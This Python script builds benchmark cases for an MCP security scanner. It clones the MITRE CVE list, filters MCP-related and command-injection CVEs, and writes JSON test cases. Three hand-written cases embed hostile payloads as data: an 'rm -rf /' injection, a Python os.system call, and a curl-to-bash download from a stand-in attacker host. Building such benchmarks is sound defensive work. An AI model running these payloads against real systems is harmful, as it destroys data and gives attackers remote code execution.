#!/usr/bin/env python3
"""Populate MCP Guardian benchmark from MITRE cvelistV5 repository.

This script:
1. Clones/updates the official MITRE CVE List repository
2. Filters for MCP-related vulnerabilities
3. Generates benchmark test cases
4. Exports to the benchmark/ directory

Usage:
    # First time setup (clones repository)
    python scripts/populate_benchmark.py --clone
    
    # Update existing clone and regenerate
    python scripts/populate_benchmark.py --update
    
    # Use existing clone without updating
    python scripts/populate_benchmark.py
    
    # Use daily baseline archive instead
    python scripts/populate_benchmark.py --archive path/to/2026-09-10_all_CVEs_at_midnight.zip

Data Source: https://github.com/CVEProject/cvelistV5
"""

import argparse
import subprocess
import sys
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from mcp_guardian.benchmark import (
    CVEBenchmarkIngester,
    CVESeverity,
    AttackVector,
    KNOWN_MCP_CVES,
)
from mcp_guardian.core.logging import get_logger

logger = get_logger(__name__)

# Configuration
CVELIST_REPO = "https://github.com/CVEProject/cvelistV5.git"
CVELIST_DIR = Path(__file__).parent.parent / "data" / "cvelistV5"
BENCHMARK_DIR = Path(__file__).parent.parent / "benchmark"


def clone_cvelist() -> bool:
    """Clone the cvelistV5 repository."""
    if CVELIST_DIR.exists():
        print(f"Repository already exists at {CVELIST_DIR}")
        print("Use --update to pull latest changes")
        return True
    
    print(f"Cloning {CVELIST_REPO}...")
    print("This may take several minutes (repository is ~2GB)")
    
    CVELIST_DIR.parent.mkdir(parents=True, exist_ok=True)
    
    try:
        # Shallow clone to save space/time
        subprocess.run(
            ["git", "clone", "--depth", "1", CVELIST_REPO, str(CVELIST_DIR)],
            check=True,
        )
        print(f"✅ Cloned to {CVELIST_DIR}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"❌ Clone failed: {e}")
        return False


def update_cvelist() -> bool:
    """Update the cvelistV5 repository."""
    if not CVELIST_DIR.exists():
        print("Repository not found. Run with --clone first.")
        return False
    
    print("Updating repository...")
    try:
        subprocess.run(
            ["git", "pull", "--depth", "1"],
            cwd=CVELIST_DIR,
            check=True,
        )
        print("✅ Updated to latest")
        return True
    except subprocess.CalledProcessError as e:
        print(f"❌ Update failed: {e}")
        return False


def populate_from_directory(cves_dir: Path) -> None:
    """Populate benchmark from CVE directory."""
    ingester = CVEBenchmarkIngester()
    
    print(f"\n📂 Loading CVEs from {cves_dir}...")
    count = ingester.load_from_directory(cves_dir)
    print(f"   Loaded {count:,} CVE records")
    
    # Filter for MCP-related
    print("\n🔍 Filtering for MCP-related vulnerabilities...")
    mcp_cves = ingester.filter_mcp_related()
    print(f"   Found {len(mcp_cves)} MCP-related CVEs")
    
    # Also get high-severity command injection CVEs (relevant to MCP)
    print("\n🔍 Filtering for CWE-78 (Command Injection)...")
    cwe78_cves = ingester.filter_by_cwe("CWE-78")
    critical_cwe78 = [c for c in cwe78_cves if c.severity == CVESeverity.CRITICAL]
    print(f"   Found {len(cwe78_cves)} CWE-78 CVEs ({len(critical_cwe78)} critical)")
    
    # Generate benchmark cases
    print("\n📝 Generating benchmark test cases...")
    cases = ingester.generate_benchmark_cases(mcp_cves)
    print(f"   Generated {len(cases)} test cases")
    
    # Export to benchmark directory
    output_dir = BENCHMARK_DIR / "cves" / "generated"
    print(f"\n💾 Exporting to {output_dir}...")
    ingester.export_benchmark_cases(cases, output_dir)
    
    # Print summary
    print("\n" + "=" * 60)
    print("📊 BENCHMARK POPULATION SUMMARY")
    print("=" * 60)
    print(f"Total CVEs loaded:        {count:,}")
    print(f"MCP-related CVEs:         {len(mcp_cves)}")
    print(f"Benchmark cases created:  {len(cases)}")
    print(f"Output directory:         {output_dir}")
    
    if mcp_cves:
        print("\n🎯 Top MCP-Related CVEs Found:")
        for cve in sorted(mcp_cves, key=lambda c: c.cvss_score or 0, reverse=True)[:10]:
            score = f"CVSS {cve.cvss_score}" if cve.cvss_score else "No CVSS"
            print(f"   • {cve.cve_id} ({cve.severity.value.upper()}, {score})")
            print(f"     {cve.description[:80]}...")
    
    # Check for known CVEs
    print("\n🔎 Checking for known MCP CVEs in dataset:")
    for cve_id in KNOWN_MCP_CVES:
        found = any(c.cve_id == cve_id for c in ingester.cve_records)
        status = "✅ Found" if found else "❌ Not in dataset (may need manual addition)"
        print(f"   {cve_id}: {status}")


def populate_from_archive(archive_path: Path) -> None:
    """Populate benchmark from daily baseline archive."""
    ingester = CVEBenchmarkIngester()
    
    print(f"\n📦 Loading CVEs from archive {archive_path}...")
    count = ingester.load_from_archive(archive_path)
    print(f"   Loaded {count:,} CVE records")
    
    # Same processing as directory
    print("\n🔍 Filtering for MCP-related vulnerabilities...")
    mcp_cves = ingester.filter_mcp_related()
    print(f"   Found {len(mcp_cves)} MCP-related CVEs")
    
    cases = ingester.generate_benchmark_cases(mcp_cves)
    
    output_dir = BENCHMARK_DIR / "cves" / "generated"
    ingester.export_benchmark_cases(cases, output_dir)
    
    print(f"\n✅ Exported {len(cases)} benchmark cases to {output_dir}")


def create_manual_benchmark_cases() -> None:
    """Create benchmark cases for known MCP CVEs that may not be in cvelistV5 yet."""
    import json
    
    print("\n📝 Creating manual benchmark cases for known MCP CVEs...")
    
    manual_cases = [
        {
            "cve_id": "CVE-2025-6514",
            "name": "cve_2025_6514_mcp_remote_command_injection",
            "description": "OS command injection vulnerability in mcp-remote package allowing arbitrary command execution via unsanitized stdio transport arguments",
            "severity": "critical",
            "cwe": "CWE-78",
            "vulnerable_tool": {
                "name": "remote_execute",
                "description": "Execute commands on remote MCP server",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "host": {"type": "string"},
                        "command": {"type": "string"},
                        "args": {"type": "array", "items": {"type": "string"}}
                    },
                    "required": ["host", "command"]
                }
            },
            "attack_scenario": {
                "payload": "; rm -rf / #",
                "flow": ["user_input", "command_parameter", "shell_exec(unsanitized)"]
            },
            "taint_analysis": {
                "source": {"parameter": "command", "label": ["PUBLIC", "UNTRUSTED"]},
                "sink": {"operation": "shell_exec", "label": ["INTERNAL", "TRUSTED"]}
            },
            "expected_detection": {
                "mcp_guardian": True,
                "mcp_scanner": True,
                "mcts": True,
                "mcpsec": False
            },
            "detection_mechanism": "Cross-Tool Taint Tracking (UNTRUSTED → EXEC)",
            "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-6514"]
        },
        {
            "cve_id": "CVE-2025-49596",
            "name": "cve_2025_49596_anthropic_mcp_inspector_rce",
            "description": "Remote Code Execution vulnerability in Anthropic MCP Inspector allowing full system compromise via malicious MCP server response deserialization",
            "severity": "critical",
            "cwe": "CWE-94",
            "vulnerable_tool": {
                "name": "inspect_server",
                "description": "Debug and inspect MCP server responses",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "server_url": {"type": "string"},
                        "method": {"type": "string"},
                        "params": {"type": "object"}
                    },
                    "required": ["server_url", "method"]
                }
            },
            "attack_scenario": {
                "payload": "__import__('os').system('id')",
                "flow": ["malicious_server", "inspector", "deserialize_response", "arbitrary_code_execution"]
            },
            "taint_analysis": {
                "source": {"parameter": "server_response", "label": ["PUBLIC", "UNTRUSTED"]},
                "sink": {"operation": "eval", "label": ["INTERNAL", "TRUSTED"]}
            },
            "expected_detection": {
                "mcp_guardian": True,
                "mcp_scanner": False,
                "mcts": False,
                "mcpsec": False
            },
            "detection_mechanism": "Capability Chain Analysis (blast radius calculation)",
            "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-49596"]
        },
        {
            "cve_id": "CVE-2026-45018",
            "name": "cve_2026_45018_chainlit_mcp_command_injection",
            "description": "Critical command injection when features.mcp.enabled is active in Chainlit deployments, CVSS 9.8",
            "severity": "critical",
            "cwe": "CWE-78",
            "cvss": 9.8,
            "vulnerable_tool": {
                "name": "chainlit_tool_executor",
                "description": "Execute Chainlit tool with MCP integration",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "tool_name": {"type": "string"},
                        "arguments": {"type": "object"}
                    },
                    "required": ["tool_name"]
                }
            },
            "attack_scenario": {
                "payload": "$(curl attacker.com/shell.sh | bash)",
                "flow": ["user_input", "tool_arguments", "subprocess_call"]
            },
            "taint_analysis": {
                "source": {"parameter": "arguments", "label": ["PUBLIC", "UNTRUSTED"]},
                "sink": {"operation": "subprocess", "label": ["INTERNAL", "TRUSTED"]}
            },
            "expected_detection": {
                "mcp_guardian": True,
                "mcp_scanner": True,
                "mcts": True,
                "mcpsec": False
            },
            "detection_mechanism": "Cross-Tool Taint Tracking (UNTRUSTED → EXEC)",
            "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-45018"]
        }
    ]
    
    output_dir = BENCHMARK_DIR / "cves" / "known_mcp"
    output_dir.mkdir(parents=True, exist_ok=True)
    
    for case in manual_cases:
        output_file = output_dir / f"{case['name']}.json"
        with open(output_file, 'w') as f:
            json.dump(case, f, indent=2)
        print(f"   ✅ Created {output_file.name}")
    
    print(f"\n✅ Created {len(manual_cases)} manual benchmark cases in {output_dir}")


def main():
    parser = argparse.ArgumentParser(
        description="Populate MCP Guardian benchmark from MITRE cvelistV5"
    )
    parser.add_argument(
        "--clone",
        action="store_true",
        help="Clone the cvelistV5 repository (first time setup)"
    )
    parser.add_argument(
        "--update",
        action="store_true",
        help="Update existing cvelistV5 clone"
    )
    parser.add_argument(
        "--archive",
        type=Path,
        help="Use daily baseline archive instead of git clone"
    )
    parser.add_argument(
        "--manual-only",
        action="store_true",
        help="Only create manual benchmark cases for known MCP CVEs"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🛡️  MCP GUARDIAN BENCHMARK POPULATION")
    print("=" * 60)
    print(f"Data source: {CVELIST_REPO}")
    print(f"Output: {BENCHMARK_DIR}")
    
    # Always create manual cases for known CVEs
    create_manual_benchmark_cases()
    
    if args.manual_only:
        print("\n✅ Manual-only mode complete")
        return
    
    if args.archive:
        if not args.archive.exists():
            print(f"❌ Archive not found: {args.archive}")
            sys.exit(1)
        populate_from_archive(args.archive)
    else:
        if args.clone:
            if not clone_cvelist():
                sys.exit(1)
        elif args.update:
            if not update_cvelist():
                sys.exit(1)
        
        cves_dir = CVELIST_DIR / "cves"
        if not cves_dir.exists():
            print(f"\n❌ CVE directory not found: {cves_dir}")
            print("Run with --clone to download the repository first")
            print("\nAlternatively, download the daily baseline archive from:")
            print("https://github.com/CVEProject/cvelistV5/releases")
            print("Then run: python scripts/populate_benchmark.py --archive <path_to_zip>")
            sys.exit(1)
        
        populate_from_directory(cves_dir)
    
    print("\n" + "=" * 60)
    print("✅ BENCHMARK POPULATION COMPLETE")
    print("=" * 60)
    print("\nNext steps:")
    print("1. Review generated cases in benchmark/cves/")
    print("2. Run: python benchmark/compare_competitors.py")
    print("3. Check results in benchmark/competitor_results/")


if __name__ == "__main__":
    main()
